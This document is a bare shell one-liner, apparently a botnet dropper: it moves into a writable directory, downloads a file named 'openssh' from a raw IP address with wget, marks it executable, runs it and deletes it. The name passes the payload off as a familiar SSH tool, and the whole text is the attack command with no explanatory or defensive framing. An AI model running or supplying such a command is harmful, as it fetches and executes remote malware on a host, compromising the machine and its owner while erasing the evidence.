cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.23.238.230/openssh; chmod +x openssh; ./openssh; rm -rf openssh
